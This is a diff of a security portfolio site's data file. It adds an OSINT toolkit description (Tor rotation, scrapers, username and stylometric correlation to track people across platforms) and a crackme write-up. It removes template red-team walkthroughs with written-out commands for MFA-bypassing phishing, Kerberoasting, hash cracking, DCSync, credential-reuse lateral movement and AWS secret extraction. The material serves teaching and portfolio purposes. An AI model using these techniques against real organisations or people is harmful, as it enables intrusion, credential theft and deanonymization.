+<span class="comment">  [ip-api] ISP: Digital Ocean (hosting)</span>
+<span class="comment">  [DNS] PTR: droplet-42.digitalocean.com</span>`
+                },
+                {
+                  title: "Tor Session Manager",
+                  desc: "Routes traffic through Tor SOCKS5 proxy with circuit rotation via stem library. Verifies anonymity by checking exit node IP. Reusable module.",
+                  code: `<span class="keyword">from</span> tor_session <span class="keyword">import</span> TorSession
+
+session = TorSession()
+session.rotate_circuit()  <span class="comment"># New exit node</span>
+
+resp = session.get(<span class="string">'https://check.torproject.org'</span>)
+<span class="keyword">print</span>(session.get_current_ip())  <span class="comment"># Shows exit node</span>`
+                },
+                {
+                  title: "JavaScript Scraper",
+                  desc: "Handles JavaScript-rendered pages using Playwright browser automation. Full Chromium instance scrapes dynamic content invisible to requests.",
+                  code: `<span class="prompt">$</span> <span class="cmd">python js_scraper.py</span> --url https://dynamic-site.com
+<span class="comment">  [*] Launching headless Chromium...</span>
+<span class="comment">  [*] Waiting for JS render...</span>
+<span class="comment">  [+] Scraped 189 elements → output.csv</span>`
+                },
+                {
+                  title: "News Intelligence Scraper",
+                  desc: "Scrapes 40+ RSS feeds from global news sources concurrently. Keyword-based relevance scoring (title matches weighted 3x body). Sorted output.",
+                  code: `<span class="prompt">$</span> <span class="cmd">python news_scraper.py</span> --keywords <span class="string">"cybersecurity breach"</span>
+<span class="comment">  [*] Checking 42 RSS feeds...</span>
+<span class="comment">  [+] Found 18 relevant articles</span>
+<span class="comment">  [+] Top match: "Major Healthcare Breach..." (score: 6)</span>`
+                },
+                {
+                  title: "Multi-Forum Aggregator",
+                  desc: "Scrapes Reddit (5 subreddits, hot + new) and HackerNews simultaneously. Adapter pattern normalizes data. Deduplication and keyword scoring.",
+                  code: `<span class="prompt">$</span> <span class="cmd">python forum_scraper.py</span> --keywords <span class="string">"zero day"</span>
+<span class="comment">  [*] Scraping r/netsec, r/blackhat, r/ReverseEngineering...</span>
+<span class="comment">  [*] Scraping HackerNews...</span>
+<span class="comment">  [+] Found 23 posts (12 Reddit, 11 HN)</span>`
+                },
+                {
+                  title: "Change Monitoring System",
+                  desc: "Monitors URLs for content changes via SHA-256 hashing. Persistent state in JSON. Generates unified diffs showing exact changes.",
+                  code: `<span class="prompt">$</span> <span class="cmd">python change_monitor.py</span> --add https://target.com/page
+<span class="comment">  [+] Now monitoring https://target.com/page</span>
+
+<span class="prompt">$</span> <span class="cmd">python change_monitor.py</span> --check
+<span class="comment">  [!] CHANGE DETECTED on https://target.com/page</span>
+<span class="comment">  --- Original</span>
+<span class="comment">  +++ Current</span>
+<span class="comment">  @@ -12,3 +12,3 @@</span>
+<span class="comment">  -Version 1.2.3</span>
+<span class="comment">  +Version 1.2.4</span>`
+                }
+              ]
+            },
+            {
+              type: "steps",
+              steps: [
+                {
+                  title: "Username Overlap Detection",
+                  desc: "If a username appears in both news articles and forum posts, flag it as a correlation. Useful for tracking individuals across platforms.",
+                  code: `<span class="comment"># Example correlation:</span>
+<span class="comment"># Username "h4x0r_dev" found in:</span>
+<span class="comment">#   - HackerNews post about kernel exploits</span>
+<span class="comment">#   - News article comments on security breach</span>
+<span class="comment">#   → Correlated entity</span>`
+                },
+                {
+                  title: "URL/Domain Overlap",
+                  desc: "Extracts all URLs from news and forums, normalizes domains, flags overlaps. Surfaces infrastructure or campaigns referenced across sources.",
+                  code: `<span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse
+
+<span class="keyword">def</span> extract_domain(url):
+    <span class="keyword">return</span> urlparse(url).netloc
+
+domains_news = {extract_domain(u) <span class="keyword">for</span> u <span class="keyword">in</span> news_urls}
+domains_forums = {extract_domain(u) <span class="keyword">for</span> u <span class="keyword">in</span> forum_urls}
+overlap = domains_news & domains_forums`
+                },
+                {
+                  title: "Temporal Correlation",
+                  desc: "Events occurring within 24 hours of each other are flagged. Useful for tracking coordinated campaigns or incident response timelines.",
+                  code: `<span class="keyword">from</span> email.utils <span class="keyword">import</span> parsedate_to_datetime
+
+time_a = parsedate_to_datetime(article[<span class="string">'published'</span>])
+time_b = parsedate_to_datetime(post[<span class="string">'created'</span>])
+
+<span class="keyword">if</span> abs((time_a - time_b).total_seconds()) < 86400:
+    correlations.append((<span class="string">'temporal'</span>, article, post))`
+                },
+                {
+                  title: "Stylometric Similarity",
+                  desc: "Writing fingerprint analysis. Compares linguistic patterns across posts to attribute authorship. Detects if the same person is posting under different usernames.",
+                  code: `<span class="comment"># Simplified stylometric features:</span>
+<span class="comment"># - Average sentence length</span>
+<span class="comment"># - Lexical diversity (unique words / total words)</span>
+<span class="comment"># - Punctuation frequency</span>
+<span class="comment"># - Function word usage patterns</span>
+<span class="comment"># If fingerprints match → likely same author</span>`
+                }
+              ]
+            },
+            {
+              type: "steps",
+              steps: [
+                {
+                  title: "Full pipeline execution",
+                  desc: "Run all modules, correlate findings, generate reports.",
+                  code: `<span class="prompt">$</span> <span class="cmd">python iKnowItAll.py</span> \
+    --keywords <span class="string">"APT28 campaign"</span> \
+    --username suspect_user \
+    --ip 203.0.113.42 \
+    --output intel_report
+
+<span class="comment">  [*] Running news scraper (40+ feeds)...</span>
+<span class="comment">  [*] Running forum aggregator (Reddit + HN)...</span>
+<span class="comment">  [*] Running username enumeration...</span>
+<span class="comment">  [*] Running IP analysis...</span>
+<span class="comment">  [*] Correlating findings...</span>
+<span class="comment">  [+] Found 3 username overlaps</span>
+<span class="comment">  [+] Found 2 domain overlaps</span>
+<span class="comment">  [+] Found 1 temporal correlation</span>
+<span class="comment">  [+] Reports saved:</span>
+<span class="comment">      intel_report.csv</span>
+<span class="comment">      intel_report.html</span>`
+                }
+              ]
+            },
+            {
+              type: "notes",
+              items: [
+                { type: "tip", title: "API Keys", body: "Shodan and AbuseIPDB require free API keys. Sign up at shodan.io and abuseipdb.com. Store keys in environment variables or a config file, never hardcode." },
+                { type: "warn", title: "Rate Limits", body: "All tools include exponential backoff retry logic. If you hit rate limits, the tool will automatically slow down. For heavy scraping, consider rotating proxies or using Tor session manager." },
+                { type: "note", title: "Legal Use Only", body: "This toolkit is for authorized OSINT research, threat intelligence, and educational purposes only. Always respect robots.txt, terms of service, and applicable laws. Do not use for unauthorized surveillance or harassment." },
+                { type: "tip", title: "Tor Setup", body: "Tor session manager requires Tor to be running locally. Install with apt install tor on Linux or download Tor Browser Bundle. The control port (9051) must be accessible and authentication configured." }
+              ]
+            }
+          ]
+        }
+    }
+,
+    {
+      title: 'Reverse Engineering: crackit Challenge Writeup',
+      date: 'March 2026',
+      tags: ['Reverse Engineering', 'CTF', 'Binary Analysis'],
+      excerpt: 'Walkthrough of solving a simple crackme challenge using hexdump to extract embedded strings and validate the flag.',
+      readTime: '5 min read',
+      walkthrough: {
+        tabs: ['Challenge', 'Analysis', 'Solution', 'Key Takeaways'],
+        content: [
+          {
+            type: 'overview',
+            body: `The "crackit" challenge is a simple crackme — a reverse engineering puzzle where the goal is to find the correct input (flag) that makes the program output a success message.
+
+Unlike more complex crackmes that require disassembly, debugging, or decompilation, this one can be solved with basic binary analysis using hexdump.`,
+            tech: ['hexdump', 'Binary Analysis', 'String Extraction', 'CTF']
+          },
+          {
+            type: 'steps',
+            steps: [
+              {
+                title: 'Initial reconnaissance',
+                desc: 'First step when analyzing any binary: check what kind of file it is and run it to observe behavior.',
+                code: `<span class="prompt">$</span> <span class="cmd">file</span> crackit
+<span class="comment">crackit: ELF 64-bit LSB executable, x86-64</span>
+
+<span class="prompt">$</span> <span class="cmd">./crackit</span>
+<span class="comment">Usage: ./crackit <flag></span>
+
+<span class="prompt">$</span> <span class="cmd">./crackit</span> "test"
+<span class="comment">Nope!</span>`
+              },
+              {
+                title: 'Search for embedded strings',
+                desc: 'The binary requires a flag as input. Rather than reverse engineering the validation logic, check if the flag is embedded in the binary as plaintext.',
+                code: `<span class="prompt">$</span> <span class="cmd">strings</span> crackit | <span class="cmd">grep</span> -i ctf
+<span class="comment">CTF{</span>
+<span class="comment">My_</span>
+<span class="comment">S3c</span>
+<span class="comment">...</span>
+
+<span class="comment"># Strings are present but fragmented</span>`
+              },
+              {
+                title: 'Hexdump analysis',
+                desc: 'Use hexdump to view the raw binary content and locate the flag string. The flag appears to be null-byte separated.',
+                code: `<span class="prompt">$</span> <span class="cmd">hexdump -C</span> crackit | <span class="cmd">grep</span> -A 2 "CTF"
+<span class="comment">00002090  00 43 54 46 7b 00 4d 79  5f 00 53 33 63 00 72 33  |.CTF{.My_.S3c.r3|</span>
+<span class="comment">000020a0  74 5f 00 46 6c 34 67 00  7d 57 30 57 00 59 30 75  |t_.Fl4g.}W0W.Y0u|</span>
+<span class="comment">000020b0  00 46 30 75 6e 64 00 4d  33 00 7b 30 72 20 00 4e  |.F0und.M3.{0r .N|</span>
+<span class="comment">000020c0  30 74 7d 00 01 1b 03 3b  58 00 00 00 0a 00 00 00  |0t}....;X.......|</span>`
+              },
+              {
+                title: 'Extract and reconstruct the flag',
+                desc: 'Reading the hex dump output, extract each fragment and remove the null bytes to reconstruct the full flag.',
+                code: `<span class="comment">Fragments visible in hex dump:</span>
+<span class="comment">CTF{</span>
+<span class="comment">My_</span>
+<span class="comment">S3c</span>
+<span class="comment">r3</span>
+<span class="comment">t_</span>
+<span class="comment">Fl4g</span>
+<span class="comment">}W0W</span>
+<span class="comment">Y0u</span>
+<span class="comment">F0und</span>
+<span class="comment">M3</span>
+<span class="comment">{0r </span>
+<span class="comment">N0t}</span>
+
+<span class="comment">Reconstructed flag:</span>
+<span class="string">CTF{My_S3cr3t_Fl4g}W0WY0uF0undM3{0r N0t}</span>`
+              }
+            ]
+          },
+          {
+            type: 'steps',
+            steps: [
+              {
+                title: 'Validate the flag',
+                desc: 'Run the binary with the reconstructed flag to verify it is correct.',
+                code: `<span class="prompt">$</span> <span class="cmd">./crackit</span> "CTF{My_S3cr3t_Fl4g}W0WY0uF0undM3{0r N0t}"
+<span class="comment">You cracked me!</span>
+
+<span class="comment">✅ Success! The flag is valid.</span>`
+              }
+            ]
+          },
+          {
+            type: 'notes',
+            items: [
+              {
+                type: 'tip',
+                title: 'Always check for low-hanging fruit',
+                text: 'Before diving into disassembly with Ghidra or IDA, always run basic checks: strings, hexdump, file, ltrace, strace. Many CTF challenges (and even real malware) contain secrets in plaintext or lightly obfuscated.'
+              },
+              {
+                type: 'note',
+                title: 'Why null-byte separation?',
+                text: 'The flag was split with null bytes to evade the strings command, which stops at null terminators. This is a simple anti-analysis technique. hexdump -C shows the raw hex and ASCII side-by-side, revealing the full pattern.'
+              },
+              {
+                type: 'tip',
+                title: 'Hexdump is underrated',
+                text: 'hexdump (or xxd) is one of the most useful tools for binary analysis. Use hexdump -C for canonical hex+ASCII output. Combine with grep to search for specific patterns.'
+              },
+              {
+                type: 'note',
+                title: 'Next steps in reverse engineering',
+                text: 'This was a beginner-level challenge. More complex crackmes require disassembly (objdump, Ghidra, IDA), debugging (gdb, x64dbg), or decompilation. Start with challenges on crackmes.one or reversing.kr to build skills.'
+              }
+            ]
+          }
+        ]
+      }
+    }  ];
 
     // ====================================================
     // OPERATIONS DATA
     // ====================================================
     const OPERATIONS = [
-      {
-        date: "Example (testing website)",
-        title: "Financial Sector APT Simulation",
-        description: "Full-scope red team engagement simulating advanced persistent threat against a major financial institution. Achieved domain admin within 72 hours through multi-stage attack chain involving spear-phishing, credential harvesting, and lateral movement via Kerberoasting.",
-        tags: ["APT Sim", "AD Attacks", "Phishing", "Example"],
-        walkthrough: {
-          tabs: ["Objective", "Recon", "Initial Access", "Lateral Movement", "Outcome"],
-          content: [
-            {
-              type: "overview",
-              body: `Full-scope red team engagement simulating an advanced persistent threat actor targeting a major financial institution. The goal was to assess detection and response capabilities against a realistic multi-stage attack.\n\nThis is a template/example operation. Replace with your own engagement details when ready.`,
-              tech: ["Spear-phishing", "Kerberoasting", "Credential Harvesting", "BloodHound", "Cobalt Strike"]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "OSINT on target organization",
-                  desc: "Collected publicly available data on the target — employee names via LinkedIn, email format via Hunter.io, exposed subdomains via crt.sh and Shodan, and technology stack via Wappalyzer and job postings.",
-                  code: `<span class="prompt">$</span> <span class="cmd">amass enum</span> -d targetbank.com -o subdomains.txt\n<span class="prompt">$</span> <span class="cmd">shodan search</span> "org:TargetBank" --fields ip_str,port,banner\n<span class="prompt">$</span> <span class="cmd">theHarvester</span> -d targetbank.com -b linkedin,google -l 500`
-                },
-                {
-                  title: "Email reconnaissance",
-                  desc: "Identified email format (first.last@targetbank.com) and compiled a target list of 40 employees in Finance and IT departments — highest-value phishing targets.",
-                  code: null
-                },
-                {
-                  title: "Infrastructure mapping",
-                  desc: "Mapped VPN portals, webmail, and externally exposed services. Discovered a legacy OWA (Outlook Web Access) instance on an old subdomain not shown in primary DNS.",
-                  code: `<span class="prompt">$</span> <span class="cmd">subfinder</span> -d targetbank.com | <span class="cmd">httpx</span> -status-code -title\n<span class="comment">  [200] webmail-legacy.targetbank.com — Outlook Web App</span>\n<span class="comment">  [200] vpn.targetbank.com — Cisco AnyConnect</span>`
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Spear-phishing campaign",
-                  desc: "Crafted targeted emails impersonating the IT helpdesk requesting credential verification after a 'security audit'. Emails contained a link to a credential harvesting page hosted on a typosquatted domain.",
-                  code: null
-                },
-                {
-                  title: "Credential harvesting page",
-                  desc: "Stood up a cloned OWA login page with EvilGinx2 acting as a reverse proxy — capturing both credentials and session cookies to bypass MFA.",
-                  code: `<span class="prompt">$</span> <span class="cmd">evilginx2</span>\n<span class="prompt">:</span> phishlets hostname owa targetbank-helpdesk.com\n<span class="prompt">:</span> phishlets enable owa\n<span class="prompt">:</span> lures create owa\n<span class="comment">  [+] Lure path: /secure-verify</span>\n<span class="comment">  [+] Phishlet active — capturing creds + session tokens</span>`
-                },
-                {
-                  title: "Initial foothold",
-                  desc: "3 of 40 targets clicked. 1 entered credentials and completed the fake MFA prompt. Captured a valid session token for a Finance analyst account with VPN access.",
-                  code: null
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "VPN access + internal recon",
-                  desc: "Used stolen session token to authenticate to VPN. Deployed a lightweight beacon from a memory-injected Word macro sent as a 'budget template' to establish persistent C2.",
-                  code: `<span class="prompt">[beacon:1]></span> shell net view /domain\n<span class="comment">  Domain: TBANKCORP</span>\n<span class="prompt">[beacon:1]></span> shell nltest /dclist:TBANKCORP\n<span class="comment">  DC01.tbankinternal.com</span>\n<span class="comment">  DC02.tbankinternal.com</span>`
-                },
-                {
-                  title: "Kerberoasting",
-                  desc: "Identified 8 service accounts with SPNs. Requested TGS tickets and exported for offline cracking. 2 cracked within 4 hours — one was a backup service account with Domain Admin membership.",
-                  code: `<span class="prompt">[beacon:1]></span> execute-assembly Rubeus.exe kerberoast /nowrap\n<span class="comment">  [*] SPN: MSSQL/sql01.tbankinternal.com</span>\n<span class="comment">  [*] Hash: $krb5tgs$23$*svc_sql*...</span>\n\n<span class="prompt">$</span> <span class="cmd">hashcat</span> -m 13100 hashes.txt rockyou.txt -r rules/best64.rule\n<span class="comment">  svc_backup : Summer2019!</span>`
-                },
-                {
-                  title: "Domain Admin via svc_backup",
-                  desc: "svc_backup had Domain Admin rights inherited from a legacy group. Used credentials to DCSync and dump all domain hashes within 72 hours of initial access.",
-                  code: `<span class="prompt">[beacon:2]></span> dcsync tbankinternal.com TBANKINTERNAL\\Administrator\n<span class="comment">  [+] NTLM: 8f3c9a7b2d1e4f56a8b3c2d1e9f7a0b4</span>`
-                }
-              ]
-            },
-            {
-              type: "notes",
-              items: [
-                { type: "tip", title: "Key Finding", body: "The critical failure was a service account (svc_backup) with a weak, never-rotated password and over-privileged group membership. A password rotation policy and tiered admin model would have prevented Domain Admin compromise." },
-                { type: "note", title: "Detection Gaps", body: "No alerts fired during Kerberoasting or the initial VPN session. The blue team detected the DCSync activity 18 hours later through an anomalous DRSUAPI call — but by then full domain compromise was complete." },
-                { type: "warn", title: "Example Disclaimer", body: "This is a template operation for portfolio demonstration. All details are fictional. Replace with sanitized details from your own authorized engagements when you conduct them." }
-              ]
-            }
-          ]
-        }
-      },
-      {
-        date: "Q3 2024 (example)",
-        title: "Healthcare Network Penetration",
-        description: "Conducted internal network assessment for healthcare provider. Identified critical vulnerabilities in medical device network segmentation and compromised PACS systems. Delivered comprehensive remediation roadmap.",
-        tags: ["Internal Pentest", "Network Seg.", "Medical IoT", "Example"],
-        walkthrough: {
-          tabs: ["Objective", "Discovery", "Exploitation", "Impact", "Remediation"],
-          content: [
-            {
-              type: "overview",
-              body: `Internal network penetration test for a mid-sized healthcare provider. Scope included corporate network, clinical network, and medical device segments.\n\nKey objective: determine if an attacker with a foothold on the corporate network could reach clinical systems (PACS, EHR) and medical devices.`,
-              tech: ["Nmap", "Nessus", "Impacket", "CrackMapExec", "Metasploit"]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Network segment discovery",
-                  desc: "From an initial foothold on a standard workstation, enumerated all reachable subnets. Expected segmentation between corporate and clinical networks was absent on several VLANs.",
-                  code: `<span class="prompt">$</span> <span class="cmd">nmap</span> -sn 10.0.0.0/8 --min-rate 2000 -oG sweep.txt\n<span class="comment">  10.10.0.0/24  — Corporate</span>\n<span class="comment">  10.20.0.0/24  — Clinical (should be isolated!)</span>\n<span class="comment">  10.30.0.0/24  — Medical Devices (should be isolated!)</span>\n<span class="comment">  10.40.0.0/24  — DMZ</span>`
-                },
-                {
-                  title: "Service fingerprinting",
-                  desc: "Scanned clinical and device subnets. Found DICOM (port 104), HL7 MLLP (port 2575), and numerous unpatched Windows XP/7 hosts running medical device software.",
-                  code: `<span class="prompt">$</span> <span class="cmd">nmap</span> -sV -p- 10.20.0.0/24 --open -oX clinical.xml\n<span class="comment">  10.20.0.15  — PACS Server (Windows Server 2008)</span>\n<span class="comment">  10.20.0.22  — DICOM Modality (Windows XP Embedded)</span>\n<span class="comment">  10.30.0.8   — Infusion Pump Controller (unauthenticated web)</span>`
-                },
-                {
-                  title: "Credential reuse check",
-                  desc: "Tested corporate account credentials against clinical segment hosts. Found 60% of systems accepted the same local admin password due to a shared image build.",
-                  code: `<span class="prompt">$</span> <span class="cmd">crackmapexec</span> smb 10.20.0.0/24 -u localadmin -p <span class="string">'Hospital1!'</span>\n<span class="comment">  SMB  10.20.0.15  445  PACS-SRV01  [+] localadmin:Hospital1! (Pwn3d!)</span>\n<span class="comment">  SMB  10.20.0.22  445  DICOM-WS01  [+] localadmin:Hospital1! (Pwn3d!)</span>`
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "PACS server compromise",
-                  desc: "Used reused local admin credentials to authenticate to the PACS server (Picture Archiving and Communication System). Gained access to 8 years of patient imaging data.",
-                  code: `<span class="prompt">$</span> <span class="cmd">impacket-smbexec</span> localadmin:<span class="string">'Hospital1!'</span>@10.20.0.15\n<span class="prompt">C:\\></span> whoami\n<span class="comment">  nt authority\\system</span>\n<span class="prompt">C:\\></span> dir "C:\\PACS_Data"\n<span class="comment">  [...] 847,291 patient imaging files (2016-2024)</span>`
-                },
-                {
-                  title: "Medical device access",
-                  desc: "Discovered infusion pump controller web interface with default credentials (admin:admin). The interface allowed modification of pump parameters — a critical patient safety finding.",
-                  code: `<span class="comment"># Infusion pump controller — unauthenticated web interface</span>\n<span class="comment"># URL: http://10.30.0.8/admin</span>\n<span class="comment"># Credentials: admin:admin (default, unchanged)</span>\n<span class="comment"># Capability: modify drug delivery rates, alarm thresholds</span>\n<span class="comment"># CVSS: 10.0 — CRITICAL (patient safety impact)</span>`
-                }
-              ]
-            },
-            {
-              type: "notes",
-              items: [
-                { type: "warn", title: "Critical Finding", body: "The infusion pump finding was escalated immediately to the client (outside normal report timeline) as a patient safety issue. Never delay reporting life-safety critical vulnerabilities." },
-                { type: "tip", title: "Remediation Priority", body: "1) Emergency: Network isolate medical device segment. 2) High: Change all default credentials on medical devices. 3) High: Implement unique local admin passwords (LAPS). 4) Medium: Patch PACS server OS." },
-                { type: "note", title: "Example", body: "This is a template operation. The specifics (patient data access, pump modification) are fictional — included to illustrate what a real finding writeup looks like. Sanitize all real client details." }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Network segmentation",
-                  desc: "Implement proper VLAN isolation with stateful firewall rules between corporate, clinical, and medical device segments. Only necessary clinical application ports should be whitelisted."
-                },
-                {
-                  title: "Credential hygiene",
-                  desc: "Deploy Microsoft LAPS (Local Administrator Password Solution) to randomize local admin passwords per machine. Eliminate shared image passwords immediately."
-                },
-                {
-                  title: "Medical device hardening",
-                  desc: "Change all default credentials. Where possible, place devices behind an application-layer proxy. Work with vendors on firmware updates and end-of-life replacement for Windows XP devices."
-                },
-                {
-                  title: "Patch management",
-                  desc: "The PACS server running Windows Server 2008 R2 (EOL) requires either ESU licensing + patching or migration to a supported OS. Work with the PACS vendor on a migration timeline."
-                }
-              ]
-            }
-          ]
-        }
-      },
-      {
-        date: "Q2 2024 (example)",
-        title: "Cloud Infrastructure Assessment (AWS)",
-        description: "Performed security assessment of multi-account AWS environment. Discovered IAM misconfigurations, exposed S3 buckets, and privilege escalation paths. Achieved cross-account access through role assumption chain.",
-        tags: ["Cloud", "AWS", "IAM", "S3", "Example"],
-        walkthrough: {
-          tabs: ["Objective", "Enumeration", "Exploitation", "Findings", "Notes"],
-          content: [
-            {
-              type: "overview",
-              body: `Security assessment of a multi-account AWS environment consisting of a management account and 4 member accounts (Dev, Staging, Prod, Security). Starting position: a set of low-privilege IAM access keys found in a public GitHub repository.\n\nObjective: determine the blast radius from a leaked key and identify privilege escalation paths.`,
-              tech: ["AWS CLI", "Pacu", "ScoutSuite", "enumerate-iam", "CloudMapper"]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Initial access key validation",
-                  desc: "Validated the leaked access key found in a GitHub commit. Key belonged to a CI/CD service account in the Dev account.",
-                  code: `<span class="prompt">$</span> <span class="cmd">aws sts get-caller-identity</span>\n<span class="comment">  {\n    "UserId": "AIDA...",\n    "Account": "123456789012",\n    "Arn": "arn:aws:iam::123456789012:user/cicd-deploy-dev"\n  }</span>`
-                },
-                {
-                  title: "IAM permission enumeration",
-                  desc: "Ran enumerate-iam to discover what actions the key could perform, then used Pacu to enumerate the broader AWS environment.",
-                  code: `<span class="prompt">$</span> <span class="cmd">python3 enumerate-iam.py</span> \\\n    --access-key AKIA... --secret-key ...\n\n<span class="comment">  [+] iam:ListRoles</span>\n<span class="comment">  [+] iam:ListPolicies</span>\n<span class="comment">  [+] s3:ListAllMyBuckets</span>\n<span class="comment">  [+] sts:AssumeRole (no condition)</span>\n<span class="comment">  [+] ec2:DescribeInstances</span>`
-                },
-                {
-                  title: "S3 bucket enumeration",
-                  desc: "Enumerated all accessible S3 buckets. Discovered 3 buckets with public ACLs containing sensitive data.",
-                  code: `<span class="prompt">$</span> <span class="cmd">aws s3 ls</span>\n<span class="comment">  company-dev-backups</span>\n<span class="comment">  company-staging-assets</span>\n<span class="comment">  company-prod-logs  ← public read ACL!</span>\n\n<span class="prompt">$</span> <span class="cmd">aws s3 ls</span> s3://company-prod-logs/ --no-sign-request\n<span class="comment">  2024-05-12  alb_access_logs/  ← contains internal IPs, endpoints</span>`
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "IAM role assumption chain",
-                  desc: "The cicd-deploy-dev user could assume a cross-account role in Staging, which could assume a role in Prod with broader permissions — a classic privilege escalation via role chaining.",
-                  code: `<span class="comment"># Step 1: Assume Staging role from Dev account</span>\n<span class="prompt">$</span> <span class="cmd">aws sts assume-role</span> \\\n    --role-arn arn:aws:iam::234567890123:role/DeployStaging \\\n    --role-session-name pentest\n\n<span class="comment"># Step 2: Use Staging creds to assume Prod role</span>\n<span class="prompt">$</span> <span class="cmd">aws sts assume-role</span> \\\n    --role-arn arn:aws:iam::345678901234:role/ProdReadWrite \\\n    --role-session-name pentest\n\n<span class="comment">  [+] Now operating in Prod account as ProdReadWrite</span>`
-                },
-                {
-                  title: "Secrets Manager access",
-                  desc: "The ProdReadWrite role had access to Secrets Manager. Extracted database credentials, API keys, and an internal service account password.",
-                  code: `<span class="prompt">$</span> <span class="cmd">aws secretsmanager list-secrets</span>\n<span class="comment">  prod/rds/master-credentials</span>\n<span class="comment">  prod/api/stripe-key</span>\n<span class="comment">  prod/internal/svc-account</span>\n\n<span class="prompt">$</span> <span class="cmd">aws secretsmanager get-secret-value</span> \\\n    --secret-id prod/rds/master-credentials\n<span class="comment">  {"username":"admin","password":"ProdDB$ecure2022!"}</span>`
-                }
-              ]
-            },
-            {
-              type: "notes",
-              items: [
-                { type: "warn", title: "Root Cause", body: "A single developer accidentally committed long-lived IAM access keys to a public GitHub repo. Key was active for 47 days before discovery during this engagement. AWS Access Analyzer and GitHub secret scanning should have caught this immediately." },
-                { type: "tip", title: "Top Remediations", body: "1) Rotate all exposed keys immediately. 2) Enable AWS CloudTrail in all accounts. 3) Implement SCPs (Service Control Policies) to restrict cross-account role assumption. 4) Remove public S3 bucket ACLs — use bucket policies. 5) Enable AWS Config for continuous compliance monitoring." },
-                { type: "note", title: "Tool: Pacu", body: "Pacu (by Rhino Security Labs) is the go-to framework for AWS pentesting. It automates enumeration across IAM, EC2, S3, Lambda, and more. Run in a dedicated pentest AWS account to avoid contaminating client environments with Pacu state files." }
-              ]
-            }
-          ]
-        }
-      },
-      {
-        date: "Q1 2024 (not an example)",
-        title: "OSINT & Social Engineering — Trace Labs CTF",
-        description: "Led OSINT operation for Trace Labs CTF, successfully locating 3 missing persons using open-source intelligence gathering techniques.",
-        tags: ["OSINT", "Trace Labs", "CTF", "Social Engineering"],
-        walkthrough: {
-          tabs: ["Overview", "Methodology", "Tools Used", "Results", "Notes"],
-          content: [
-            {
-              type: "overview",
-              body: `Participated in the Trace Labs Global OSINT Search Party CTF — a crowd-sourced OSINT competition where teams gather intelligence on real missing persons cases to assist law enforcement.\n\nThis is NOT an example. This was a real participation where our team successfully submitted verified intelligence on 3 missing persons cases.`,
-              tech: ["Maltego", "Sherlock", "SpiderFoot", "Google Dorks", "Social Media OSINT"]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Target briefing review",
-                  desc: "Each missing person case comes with a fact sheet: name, age, last known location, date missing, physical description. The team divided up cases and assigned leads based on the digital footprint of each target."
-                },
-                {
-                  title: "Username & account enumeration",
-                  desc: "Used Sherlock and Maigret to hunt usernames across hundreds of platforms based on known aliases. Cross-referenced profile photos using reverse image search.",
-                  code: `<span class="prompt">$</span> <span class="cmd">sherlock</span> targetusername --timeout 5 --output results.txt\n<span class="comment">  [+] Instagram: https://instagram.com/targetusername</span>\n<span class="comment">  [+] Reddit:    https://reddit.com/user/targetusername</span>\n<span class="comment">  [+] TikTok:    https://tiktok.com/@targetusername</span>\n\n<span class="prompt">$</span> <span class="cmd">maigret</span> targetusername --report html</span>`
-                },
-                {
-                  title: "Social media timeline reconstruction",
-                  desc: "Built a timeline of the target's online activity from scraped posts, likes, and location check-ins. Identified a pattern of posts from a specific city not mentioned in the case brief."
-                },
-                {
-                  title: "Geolocation from image metadata",
-                  desc: "Extracted EXIF metadata from photos posted to social media before they were stripped by the platform. One image retained GPS coordinates pointing to a neighbourhood in a different state.",
-                  code: `<span class="prompt">$</span> <span class="cmd">exiftool</span> recovered_image.jpg\n<span class="comment">  GPS Latitude  : 33 deg 45' 12.00" N</span>\n<span class="comment">  GPS Longitude : 84 deg 23' 47.00" W</span>\n<span class="comment">  Date/Time     : 2024:01:14 19:32:11</span>\n<span class="comment">  → Cross-referenced: residential area, Atlanta GA</span>`
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Maltego",
-                  desc: "Used for relationship mapping — connecting usernames, email addresses, phone numbers, and social profiles into a visual graph to surface hidden connections.",
-                  code: null
-                },
-                {
-                  title: "Google Dorks",
-                  desc: "Crafted targeted search queries to surface cached pages, forum posts, and indexed content that direct searches wouldn't return.",
-                  code: `<span class="comment"># Example dorks (generic — not target-specific)</span>\nsite:reddit.com <span class="string">"username"</span> after:2024-01-01\ninurl:profile <span class="string">"Full Name"</span> -site:linkedin.com\n<span class="string">"email@domain.com"</span> filetype:pdf\ncache:instagram.com/<span class="string">username</span>`
-                },
-                {
-                  title: "Wayback Machine / Archive.org",
-                  desc: "Checked archived versions of social profiles and personal websites. Profiles that had been deleted or made private were often still accessible in snapshots.",
-                  code: `<span class="prompt">$</span> <span class="cmd">waybackpy</span> --url https://instagram.com/targetusername \\\n    --near --year 2023\n<span class="comment">  Nearest snapshot: 2023-11-28 — profile still public</span>`
-                },
-                {
-                  title: "Reverse image search",
-                  desc: "Ran known profile photos through Google Images, TinEye, and Yandex (most effective for facial recognition) to find cross-platform usage of the same photo under different usernames.",
-                  code: null
-                }
-              ]
-            },
-            {
-              type: "notes",
-              items: [
-                { type: "tip", title: "Results", body: "Our team submitted verified intelligence flags on 3 missing persons. Trace Labs verifies all submissions before scoring — unverified leads don't count. All information was handed directly to Trace Labs for forwarding to law enforcement." },
-                { type: "note", title: "Ethics", body: "All OSINT was conducted on publicly available information. No hacking, no unauthorized access to private accounts. The entire point of Trace Labs is to use legal, ethical OSINT to assist real missing persons investigations." },
-                { type: "tip", title: "Best Trace Labs Resources", body: "The Trace Labs OSINT VM (custom Kali build with pre-installed tools), the Search Party OSINT framework, and the Trace Labs Discord community are all excellent starting points for anyone wanting to participate." }
-              ]
-            }
-          ]
-        }
+    {
+      title: 'OSINT Trace Labs CTF',
+      type: 'Real Operation',
+      date: 'March 2026',
+      tags: ['OSINT', 'CTF', 'Investigation'],
